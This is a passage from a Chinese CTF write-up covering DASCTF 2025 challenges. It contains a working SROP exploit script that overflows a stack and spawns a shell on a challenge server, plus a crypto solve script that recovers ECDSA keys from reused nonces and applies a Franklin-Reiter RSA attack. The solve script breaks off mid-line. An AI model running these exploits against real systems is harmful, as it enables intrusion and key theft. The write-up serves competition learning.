alt="image-20250623014811504"></p><ul><li>但是由于先要通过溢出才能构造<code>SROP链</code>，并且溢出必然会覆盖<code>__libc_Start_call_main</code>这个函数的地址。但是注意到<code>__libc_start_main+133</code>这边是在<code>__libc_start_call_main</code>函数的附件，这样其实就选择使用<code>爆破1</code>个字节来得到返回到<code>__libc_start_call_main</code>那边的<code>syscall</code>。</li><li>但是在执行之前，需要先在<code>__libc_start_main+133</code>后面的地址处布置好<code>srop</code>所需要的数据。但是由于溢出字节不够，我们只每次<code>0x10</code>字节将<code>SROP</code>链写入到bss段中。</li><li>这里要解释一下为什么写完要跳到<code>bss_addr-0x250</code>这边，其实是为了让<code>rsi</code>跑远一点不能与<code>rsp</code>小<code>0x10</code>字节（<strong>这个地方后面还需要用到</strong>），如果<code>rsi=rsp-0x10</code>，程序会在<code>read</code>调用之后，从<code>rsi</code>所指地址中写入数据，此时就会覆盖<code>call read</code>时压入栈上的返回地址，导致程序出现问题。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_srop</span>(<span class="params">i</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+i*<span class="number">0x10</span>)</span><br><span class="line">        payload+= p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*i:i*<span class="number">0x10</span>+<span class="number">0x10</span>]+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">        payload += p64(main_read)</span><br><span class="line">        p.send(payload)</span><br></pre></td></tr></table></figure><ul><li>布置srop的结构如下，并且布置完srop后的栈图如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>-<span class="number">0x10</span></span><br><span class="line">frame.rbp = bss_addr + <span class="number">0x20</span></span><br><span class="line">frame.rsp = <span class="number">0x404578</span></span><br><span class="line">frame.rip = <span class="number">0x40114F</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623020638831.png" alt="image-20250623020638831"></p><ul><li>布置完后，我们就需要步骤<code>rop</code>链，将系统调用号<code>15</code>给<code>rax</code>，但是我们要通过正常溢出是不可能的，此时我们就需要通过前面<code>read</code>的那个<strong>小技巧</strong>这样才能同时构造<code>rop</code>链，并且还能溢出修改<code>0x2</code>个字节将<code>__libc_start_main+133</code>修改为<code>__libc_start_call_main</code>处的那个<code>syscall</code>。</li><li>所以最后一次返回的时候，我们要满足<code>rsp=rbp</code>并且<code>rsi=rsp-0x10</code>,在没有调用<code>read</code>的时候栈布局是这样的。</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021303529.png" alt="image-20250623021303529"></p><ul><li>在调用read之后写入数据，还没返回时，栈布局是这样的。</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021403899.png" alt="image-20250623021403899"></p><ul><li>所以调用<code>read</code>从<code>rsi</code>开始写数据的时候，就会先将<code>ret_addr</code>给覆盖了，我们就可以提前布置<code>rop</code>链将<code>ret_addr</code>布置成<code>pop_rax ret</code>，之后再将<code>ccc</code>修改成<code>15</code>，最后修改<code>ret_addr</code>的最后两个字节，其中我们需要爆破<code>4位</code>。构造之后的栈布局如下：</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021623074.png" alt="image-20250623021623074"></p><ul><li>这样我们其实就能getshell了，这里在打本地的时候关闭了<code>ASLR</code></li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021646015.png" alt="image-20250623021646015"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29433</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    bss_addr = <span class="number">0x404018</span>+<span class="number">0x600</span>+<span class="number">0x8</span></span><br><span class="line">    main_read = <span class="number">0x401133</span></span><br><span class="line">    start_addr = <span class="number">0x401040</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr) + p64(main_read)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a*0x10+ p64(bss_addr) + p64(main_read)&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(bss_addr-<span class="number">0x50</span>) + p64(main_read)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a*0x10+p64(bss_addr-0x50) + p64(main_read)&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(bss_addr-<span class="number">0x90</span>) + p64(start_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#payload = b&#x27;a&#x27;*0x10 + p64(bss_addr-0x90) + p64()</span></span><br><span class="line">    <span class="comment">#p.send(payload)</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span></span><br><span class="line">    frame.rdi = bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>-<span class="number">0x10</span></span><br><span class="line">    frame.rbp = bss_addr + <span class="number">0x20</span></span><br><span class="line">    frame.rsp = <span class="number">0x404578</span></span><br><span class="line">    frame.rip = <span class="number">0x40114F</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(frame))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(frame)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bytes</span>(frame)[<span class="number">0</span>:<span class="number">8</span>]))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_srop</span>(<span class="params">i</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+i*<span class="number">0x10</span>)</span><br><span class="line">        payload+= p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*i:i*<span class="number">0x10</span>+<span class="number">0x10</span>]+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">        payload += p64(main_read)</span><br><span class="line">        p.send(payload)</span><br><span class="line">    my_srop(<span class="number">0</span>)</span><br><span class="line">    my_srop(<span class="number">1</span>)</span><br><span class="line">    my_srop(<span class="number">2</span>)</span><br><span class="line">    my_srop(<span class="number">3</span>)</span><br><span class="line">    my_srop(<span class="number">4</span>)</span><br><span class="line">    my_srop(<span class="number">5</span>)</span><br><span class="line">    my_srop(<span class="number">6</span>)</span><br><span class="line">    my_srop(<span class="number">7</span>)</span><br><span class="line">    my_srop(<span class="number">8</span>)</span><br><span class="line">    my_srop(<span class="number">9</span>)</span><br><span class="line">    my_srop(<span class="number">0xa</span>)</span><br><span class="line">    my_srop(<span class="number">0xb</span>)</span><br><span class="line">    my_srop(<span class="number">0xc</span>)</span><br><span class="line">    my_srop(<span class="number">0xd</span>)</span><br><span class="line">    my_srop(<span class="number">0xe</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*<span class="number">0xf</span>:])</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(bss_addr-<span class="number">0xA0</span>+<span class="number">0x10</span>+<span class="number">0xf</span>*<span class="number">0x10</span>)</span><br><span class="line">    payload+= p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(frame)[<span class="number">0x10</span>*<span class="number">0xf</span>:]+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr-<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr-<span class="number">0xb8</span>-<span class="number">0x8</span>)+p64(main_read)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(bss_addr-<span class="number">0xb8</span>+<span class="number">0x10</span>-<span class="number">0x8</span>) + p64(main_read)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x401126</span>) + p64(<span class="number">15</span>)+p16(<span class="number">0x3D94</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><ul><li>远程爆破的话还是比较好爆破的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;5738e34c-<span class="number">70e8</span>-45cf-abc7-ff4eb2265229&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623021945654.png" alt="image-20250623021945654"></p><h2 id="nsusserver">NSUSServer</h2><h1 id="crypto">Crypto</h1><h2 id="excessive-security复现">Excessive Security(复现)</h2><ul><li><p>考点：<code>ecdsa</code></p></li><li><p>参考博客：<a href="https://triodelzx.github.io/">Triode Field</a></p></li><li><p>题目如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, bytes_to_long, getPrime</span><br><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;test&#125;&#x27;</span></span><br><span class="line">curve = SECP256k1  <span class="comment"># 使用的是特殊的椭圆曲线,其中G其实已知、p也其实已知、n也就是阶也已知</span></span><br><span class="line">G, n = curve.generator, curve.order</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(curve.curve)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">H</span>(<span class="params">msg</span>): <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(sha256(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">h, priv, k</span>): <span class="comment"># 进行签名操作</span></span><br><span class="line">    r = (k * G).x() % n</span><br><span class="line">    s = (inverse(k, n) * (h + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> s, r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split</span>(<span class="params">data</span>):</span><br><span class="line">    s = data.decode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data</span><br><span class="line">    <span class="keyword">return</span> [s[i::<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    blocks = split(plaintext)   <span class="comment"># 切割flag</span></span><br><span class="line">    h = <span class="built_in">list</span>(<span class="built_in">map</span>(H, blocks))    <span class="comment"># 调用H(flag1)、H(flag2)、H(flag3)、H(flag4),将返回的值组成一个列表</span></span><br><span class="line"></span><br><span class="line">    x1 = randint(<span class="number">1</span>, n - <span class="number">1</span>)      <span class="comment"># 生成随机数x1</span></span><br><span class="line">    x2 = randint(<span class="number">1</span>, n - <span class="number">1</span>)      <span class="comment"># 生成随机数x2</span></span><br><span class="line">    k1 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>) <span class="comment"># 生成随机数k1</span></span><br><span class="line">    k2 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>) <span class="comment"># 生成随机数k2</span></span><br><span class="line"></span><br><span class="line">    s1, r1 = sign(h[<span class="number">0</span>], x1, k1) <span class="comment"># 对h[0]进行椭圆曲线数字签名</span></span><br><span class="line">    s2, _  = sign(h[<span class="number">1</span>], x2, k1) <span class="comment"># 对h[1]进行椭圆曲线数字签名</span></span><br><span class="line">    s3, r2 = sign(h[<span class="number">2</span>], x1, k2) <span class="comment"># 对h[2]进行椭圆曲线数字签名</span></span><br><span class="line">    s4, _  = sign(h[<span class="number">3</span>], x2, k2) <span class="comment"># 对h[3]进行椭圆曲线签名</span></span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(plaintext)</span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c1 = <span class="built_in">pow</span>(m, e, N) <span class="comment"># 进行一次RSA加密</span></span><br><span class="line">    c2 = <span class="built_in">pow</span>(x1 * m + x2, e, N)  <span class="comment"># 对x1和x2配合m也进行一次RSA加密</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h1, s1, r1) = (<span class="subst">&#123;h[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;s1&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h2, s2, r1) = (<span class="subst">&#123;h[<span class="number">1</span>]&#125;</span>, <span class="subst">&#123;s2&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h3, s3, r2) = (<span class="subst">&#123;h[<span class="number">2</span>]&#125;</span>, <span class="subst">&#123;s3&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h4, s4, r2) = (<span class="subst">&#123;h[<span class="number">3</span>]&#125;</span>, <span class="subst">&#123;s4&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sign_encrypt(flag)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># N = 98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">    <span class="comment"># c1 = 40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">    <span class="comment"># c2 = 4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line">    <span class="comment"># (h1, s1, r1) = (68926494835039378729440404424793589316085902585443402029912033361291851069895, 70264613994433317101824708333691569351293428290775945022557096997867421112623, 95467825458659408375936425122753380788640181504557006906236884175684680903422)</span></span><br><span class="line">    <span class="comment"># (h2, s2, r1) = (99816429822339421445908151468618514820067970997726274244928092260385418279182, 27386247988345867998752358066350183725137348277248603318763377237810993039608, 95467825458659408375936425122753380788640181504557006906236884175684680903422)</span></span><br><span class="line">    <span class="comment"># (h3, s3, r2) = (100471089356874379799029324099340355602511511524623953182021635156113287196537, 108271537842404710192407976239166854351892165018292127464175836717873395489565, 13940715298251935708383205669373172931583958487449924842542107474174521484127)</span></span><br><span class="line">    <span class="comment"># (h4, s4, r2) = (53552261622392134420510144174810499568173979993026285111445672642139328877380, 100312693542625967610858608130705401648902828203826044299984002070083890684220, 13940715298251935708383205669373172931583958487449924842542107474174521484127)</span></span><br></pre></td></tr></table></figure><ul><li>这题主要考察的就是<code>ECDSA</code>，首先生成了一个椭圆曲线，这个椭圆曲线的各个参数都已知：</li></ul><p>$$<br>curve:y^2=x^3+7~mod~(115792089237316195423570985008687907853269984665640564039457584007908834671663)\<br>order:n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curve = SECP256k1  <span class="comment"># 使用的是特殊的椭圆曲线,其中G其实已知、p也其实已知、n也就是阶也已知</span></span><br><span class="line">G, n = curve.generator, curve.order</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(curve.curve)</span><br></pre></td></tr></table></figure><ul><li>这题最主要的一个破解点就是重复使用<code>k1</code>和<code>k2</code>对数据进行签名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">h, priv, k</span>): <span class="comment"># 进行签名操作</span></span><br><span class="line">    r = (k * G).x() % n</span><br><span class="line">    s = (inverse(k, n) * (h + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> s, r</span><br><span class="line"></span><br><span class="line">s1, r1 = sign(h[<span class="number">0</span>], x1, k1) <span class="comment"># 对h[0]进行椭圆曲线数字签名</span></span><br><span class="line">s2, _  = sign(h[<span class="number">1</span>], x2, k1) <span class="comment"># 对h[1]进行椭圆曲线数字签名</span></span><br><span class="line">s3, r2 = sign(h[<span class="number">2</span>], x1, k2) <span class="comment"># 对h[2]进行椭圆曲线数字签名</span></span><br><span class="line">s4, _  = sign(h[<span class="number">3</span>], x2, k2) <span class="comment"># 对h[3]进行椭圆曲线签名</span></span><br></pre></td></tr></table></figure><ul><li>接下来对这个过程进行推导</li></ul><p>$$<br>s_1 = k_1^{-1}<em>(h_1+r_1</em>x_1) ~mod~n\<br>s_2 = k_1^{-1}<em>(h_2+r_1</em>x_2) ~mod~n\<br>s_3=k_2^{-1}<em>(h_3+r_2</em>x_1)~mod~n\<br>s_4=k_2^{-1}<em>(h_4+r_2</em>x_2)~mod~n\<br>$$</p><ul><li>由于式子中的这个都是一次的，所以其实我们可以将这个式子理解成为一个模<code>n</code>下的四元一次方程组，接下来先化简一下这个式子。这样我们就可以更容易看出来这个四元一次线性方程组。</li></ul><p>$$<br>s_1k_1 = h_1+r_1x_1~mod~n\<br>s_2k_1 = h_2+r_1x_2~mod~n\<br>s_3k_2 = h_3+r_2x_1~mod~n\<br>s_4k_2 = h_4+r_2x_2~mod~n\<br>\Rightarrow\<br>s_1k_1+0k_2-r_1x_1+0x_2 = h_1~mod~n\<br>s_2k_1+0k_2+0x_1-r_1x_2 = h_2~mod~n\<br>0k_1+s_3k_2-r_2x_1+0x_2 = h_3~mod~n\<br>0k_1+s_4k_2+0x_1-r_2x_2 = h_4~mod~n\<br>$$</p><ul><li>这样其实我们就可以构造一个模<code>n</code>意义下的矩阵，解出这个矩阵对应的线性方程组就可以得到$x_1,x_2$了：</li></ul><p>$$<br>\begin{bmatrix}<br>s_1&amp;0&amp;-r_1&amp;0&amp;h_1\<br>s_2&amp;0&amp;0&amp;-r_1&amp;h_2\<br>0&amp;s_3&amp;-r_2&amp;0&amp;h_3\<br>0&amp;s_4&amp;0&amp;-r_2&amp;h_4<br>\end{bmatrix}<br>$$</p><ul><li>解出$x_1,x_2$之后就可以来看下一个加密步骤，这个比较简单考察的是<code>Franklin-Reiter攻击</code>，而且还是线性的，只要用<code>gcd</code>（普通多项式gcd算法不行，需要使用<code>H-gcd</code>）即可求得最大公因式$(x-m)$，就可以求出明文m了：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = bytes_to_long(plaintext)</span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, N) <span class="comment"># 进行一次RSA加密</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(x1 * m + x2, e, N)  <span class="comment"># 对x1和x2配合m也进行一次RSA加密</span></span><br></pre></td></tr></table></figure><ul><li>最终<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line">n = SECP256k1.order</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">c1 = <span class="number">40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">c2 = <span class="number">4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line">h1, s1, r1 = (<span class="number">68926494835039378729440404424793589316085902585443402029912033361291851069895</span>, <span class="number">70264613994433317101824708333691569351293428290775945022557096997867421112623</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">h2, s2, r1 = (<span class="number">99816429822339421445908151468618514820067970997726274244928092260385418279182</span>, <span class="number">27386247988345867998752358066350183725137348277248603318763377237810993039608</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">h3, s3, r2 = (<span class="number">100471089356874379799029324099340355602511511524623953182021635156113287196537</span>, <span class="number">108271537842404710192407976239166854351892165018292127464175836717873395489565</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">h4, s4, r2 = (<span class="number">53552261622392134420510144174810499568173979993026285111445672642139328877380</span>, <span class="number">100312693542625967610858608130705401648902828203826044299984002070083890684220</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">A = matrix(Zmod(n), [[s1, <span class="number">0</span>, -r1, <span class="number">0</span>], [s2, <span class="number">0</span>, <span class="number">0</span>, -r1], [<span class="number">0</span>, s3, -r2, <span class="number">0</span>], [<span class="number">0</span>, s4, <span class="number">0</span>, -r2]])</span><br><span class="line">v = vector(Zmod(n), [h1, h2, h3, h4])</span><br><span class="line">k1, k2, x1, x2 = A.solve_right(v)</span><br><span class="line"><span class="built_in">print</span>(x1,x2)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x^e - c1</span><br><span class="line">g = (ZZ(x1) * x + ZZ(x2))^e - c2</span><br><span class="line"></span><br><span class="line">G = 